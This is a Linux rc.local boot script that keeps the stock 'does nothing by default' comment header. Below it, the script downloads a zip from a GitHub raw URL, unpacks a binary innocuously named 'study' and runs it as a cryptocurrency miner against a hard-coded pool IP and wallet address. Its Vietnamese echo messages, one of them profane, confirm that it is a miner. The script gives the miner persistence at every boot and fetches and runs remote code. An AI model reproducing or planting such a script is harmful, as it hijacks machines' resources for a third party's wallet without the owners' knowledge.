#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/study ]; then
    if pgrep -x "study" > /dev/null
then
    echo "Miner dang chay roi , ke cmn di "
    
else

echo "Miner da install , chay thoi "
./study -o 42.119.101.40:4422 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x

     
fi
exit
fi


wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/Study.zip
unzip Study.zip
rm config.json
./study -o 42.119.101.40:4422 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x

exit 0
